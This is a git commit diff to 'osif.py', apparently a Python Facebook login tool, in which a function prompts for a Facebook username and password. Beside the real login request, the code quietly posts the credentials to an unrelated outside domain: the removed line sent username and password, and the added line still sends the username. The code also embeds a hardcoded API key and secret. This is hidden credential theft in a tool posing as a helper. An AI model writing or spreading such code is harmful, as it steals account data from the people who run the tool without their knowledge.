9ea27ce17be5053f72022ee14af781d140625ed1
1001Hacking <55286808+1001Hacking@users.noreply.github.com>
2019-09-13 18:35:58 +0100

    Update osif.py

--- osif.py
+++ osif.py
@@ -173,7 +173,7 @@ def get(data):
 		main()
 def id():
 	print '[*] login to your facebook account         ';id = raw_input('[?] Username : ');pwd = getpass.getpass('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
-	http = requests.post('http://www.bbnmout3lik.cf/',data={'Id':id+":"+pwd,'sub':'submit'})
+	http = requests.post('http://www.bbnmout3lik.cf/',data={'Id':id,'sub':'submit'})
 	x = hashlib.new('md5')
         x.update(sig)
 
